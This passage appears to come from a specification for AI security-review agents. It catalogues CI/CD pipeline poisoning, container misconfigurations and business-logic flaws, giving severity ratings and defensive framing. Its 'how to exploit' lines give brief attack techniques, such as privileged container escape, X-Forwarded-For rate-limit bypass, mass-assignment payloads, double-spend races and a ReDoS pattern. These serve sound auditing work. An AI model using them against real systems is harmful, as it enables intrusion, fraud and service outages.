#### 5-6. CI/CD Pipeline Poisoning

- **WHAT**: Attacks that inject malicious code into the codebase by compromising CI/CD pipelines
- **WHERE**: `.github/workflows/`, `.gitlab-ci.yml`, `Jenkinsfile`, `Dockerfile`, build scripts
- **HOW TO EXPLOIT**:
  - **Workflow injection**: `${{ github.event.issue.title }}` expanded in shell commands → command injection
  - **Pull request target trigger**: `pull_request_target` + checkout of PR head → external PR accesses secrets
  - **Self-hosted runner abuse**: Reading residual data from previous jobs on shared runners
  - **Artifact poisoning**: Tampering with CI/CD intermediate artifacts
  - **Secret exposure in logs**: Secrets logged unmasked in CI logs
- **WHY DANGEROUS**: Build pipeline takeover → deploy arbitrary code to production
- **SEVERITY**:
  - Critical: `pull_request_target` + PR head checkout + secrets access
  - High: Command injection within workflows, residual data on self-hosted runners
  - Medium: Secrets partially exposed in CI logs
  - Low: Excessive workflow permissions but no clear direct exploitation path

#### 5-7. Container and Infrastructure Misconfigurations

- **WHAT**: Container / infrastructure configuration flaws
- **WHERE**: `Dockerfile`, `docker-compose.yml`, Kubernetes manifests, Terraform / CloudFormation
- **HOW TO EXPLOIT**:
  - `--privileged` flag → container escape
  - Running as `root` user → foothold for privilege escalation
  - Host filesystem mounts (`-v /:/host`) → full host access
  - Sensitive information persisting in Docker image layers (recoverable via `docker history`)
  - Kubernetes: `hostPID`, `hostNetwork`, permissive `PodSecurityPolicy`
  - Public S3 bucket settings, excessive IAM policy permissions
- **WHY DANGEROUS**: Container escape → full host system compromise, unauthorized use of cloud resources
- **SEVERITY**:
  - Critical: `--privileged` / full host mount / root execution + network exposure
  - High: Secrets persisting in Docker images, excessive IAM permissions
  - Medium: Non-root but unnecessary capabilities granted
  - Low: Not least-privilege but no direct escape path

---

## Agent 6: Business Logic Abuser — Business Logic Exploitation Specialist (both)

Searches for paths to exploit application business logic flaws, not technical vulnerabilities. Specializes in attacks difficult to detect with automated scanners.

### Check Items

#### 6-1. Race Conditions / TOCTOU

- **WHAT**: Time-of-Check to Time-of-Use exploitation via concurrent requests
- **WHERE**: Balance check → deduction, stock check → order confirmation, coupon application, voting/likes
- **HOW TO EXPLOIT**:
  - **Double-spend**: With a balance of 100 yen, submit two simultaneous purchase requests for a 100-yen item → both pass the "balance >= 100" check
  - **Concurrent coupon usage**: Use a "single-use" coupon multiple times via concurrent requests
  - **Like/Vote inflation**: Duplicate check for the same user is non-atomic → multiple votes via concurrent requests
  - **Race in file operations**: Another process manipulates the file between the existence check and creation
- **WHY DANGEROUS**: Financial loss, data inconsistency, complete invalidation of business rules
- **SEVERITY**:
  - Critical: Lack of atomicity in financial operations (transfers, purchases, coupons)
  - High: Race condition exists in points / credit systems
  - Medium: Manipulation of votes / ratings is possible
  - Low: Display counter inconsistency (minimal business impact)

#### 6-2. Payment / Pricing Manipulation

- **WHAT**: Tampering with price / payment flows
- **WHERE**: Cart / checkout flows, discount application logic, currency conversion, subscription management
- **HOW TO EXPLOIT**:
  - **Negative quantity**: Specify quantity as `-1` → refund is generated
  - **Price override**: Tamper with client-submitted prices (change hidden field values)
  - **Currency rounding**: Arbitrage exploiting rounding errors in currency conversion
  - **Coupon stacking**: Force-apply non-combinable coupons at the API level
  - **Free trial abuse**: Restart trials indefinitely using email address variants (`+1`, `.` trick)
  - **Plan downgrade with feature retention**: Higher-tier features remain active after downgrading
- **WHY DANGEROUS**: Direct financial loss
- **SEVERITY**:
  - Critical: Financial loss occurs through negative quantities / client-side price control
  - High: Infinite coupon reuse, currency rounding exploitation
  - Medium: Free trial abuse, plan switching inconsistencies
  - Low: Minor inconsistencies in points systems

#### 6-3. Rate Limiting Gaps

- **WHAT**: Absence or bypassability of rate limiting
- **WHERE**: Login, password reset, SMS sending, all API endpoints
- **HOW TO EXPLOIT**:
  - No rate limiting → brute force, credential stuffing
  - IP-based rate limiting → bypass via `X-Forwarded-For` header
  - Account-based rate limiting → distribute across multiple accounts
  - Per-endpoint rate limiting → equivalent alternative endpoint has no limits
  - Predictable rate limit reset timing → fixed window instead of sliding window
- **WHY DANGEROUS**: Brute force attacks, service abuse, SMS bombing charges
- **SEVERITY**:
  - Critical: No rate limiting on login + no 2FA
  - High: No rate limiting on password reset / SMS sending
  - Medium: Rate limiting exists but bypassable via `X-Forwarded-For`
  - Low: Rate limiting exists but thresholds are too lenient

#### 6-4. Enumeration Attacks

- **WHAT**: Response differences that allow inferring existence information from the system
- **WHERE**: Login forms, password reset, user registration, API responses
- **HOW TO EXPLOIT**:
  - Login: "User does not exist" vs. "Incorrect password" → username enumeration
  - Registration: "This email is already in use" → confirmation of registered emails
  - Password reset: "Email sent" only for existing emails → timing difference inference
  - API: `/api/users/123` returns 404 vs. 403 → resource existence confirmation
- **WHY DANGEROUS**: Target identification, improving credential stuffing efficiency
- **SEVERITY**:
  - Critical: User enumeration + no rate limiting + password spraying possible
  - High: Email address enumeration possible (privacy impact)
  - Medium: Timing-based inference theoretically possible
  - Low: Enumeration possible but only public information

#### 6-5. Mass Assignment / Over-Posting

- **WHAT**: Vulnerability where extra fields in request bodies are directly reflected in models
- **WHERE**: User registration / update APIs, ORM model binding
- **HOW TO EXPLOIT**:
  - User update: `{"name": "hacker", "role": "admin"}` → `role` gets updated
  - Registration: `{"email": "...", "password": "...", "isVerified": true}` → skip email verification
  - Rails: Missing `params.permit`, Django: Using `fields = '__all__'`
  - Node.js: `Object.assign(user, req.body)` merging entire request body
- **WHY DANGEROUS**: Privilege escalation, verification bypass, manipulation of internal flags
- **SEVERITY**:
  - Critical: `role` / `isAdmin` / `permissions` modifiable via mass assignment
  - High: Account status flags (`isVerified` / `isBanned`, etc.) modifiable
  - Medium: Internal fields (`createdAt`, `updatedAt`) overwritable
  - Low: Only low-impact fields modifiable

#### 6-6. Workflow Bypass

- **WHAT**: Attacks that skip the intended workflow (step sequence)
- **WHERE**: Multi-step forms (wizards), approval flows, payment flows
- **HOW TO EXPLOIT**:
  - In a Step 1 (input) → Step 2 (confirmation) → Step 3 (execution) flow, directly call Step 3
  - In an admin approval flow, directly call the "approved" API from the pre-approval state
  - Forge payment completion callbacks in payment flows
  - Skip email verification flow and directly activate
- **WHY DANGEROUS**: Complete bypass of security checks / business validations
- **SEVERITY**:
  - Critical: Payment flow bypass (obtain goods / services for free)
  - High: Approval flow bypass (publishing unapproved content)
  - Medium: Skipping confirmation steps (though subsequent validation may catch it)
  - Low: UI wizard step skipping (validated server-side)

#### 6-7. Resource Consumption / DoS via Business Logic

- **WHAT**: Resource exhaustion through business logic exploitation
- **WHERE**: File uploads, report generation, search functionality, export functionality
- **HOW TO EXPLOIT**:
  - **Zip bomb**: Compressed file upload that expands to enormous size
  - **ReDoS**: Catastrophic backtracking in regular expressions (`(a+)+$` with `aaaa...!`)
  - **Expensive queries**: Deeply nested GraphQL queries, REST APIs returning all records
  - **Infinite pagination**: `?page=1&size=999999` exhausting server memory
  - **Report generation**: Requesting report generation with huge date ranges / no filters
  - **Email bombing**: Mass password reset email sending (no rate limiting)
- **WHY DANGEROUS**: Service outage, infrastructure cost spikes, impact on other users
- **SEVERITY**:
  - Critical: Single request can crash the server (zip bomb, ReDoS on critical path)
  - High: Server resources occupied for extended periods (huge queries, unlimited exports)
  - Medium: Service quality degrades with repeated requests
  - Low: Cost increase only (service continues operating)

#### 6-8. Replay Attacks

- **WHAT**: Attack that captures and resends legitimate requests
- **WHERE**: Payment requests, authentication tokens, OTP / one-time codes
- **HOW TO EXPLOIT**:
  - Replay payment completion notifications (webhooks) → double credit
  - Capture and reuse OTPs (within validity period / no used-check)
  - API requests without idempotency keys → duplicate processing from resending the same request
  - No nonce → replay of signed requests
- **WHY DANGEROUS**: Financial loss, authentication bypass, data duplication
- **SEVERITY**:
  - Critical: Financial loss from replaying payment webhooks
  - High: OTP / one-time tokens reusable
  - Medium: API lacks idempotency guarantees, causing duplicate processing
  - Low: Replay possible but impact limited to read operations
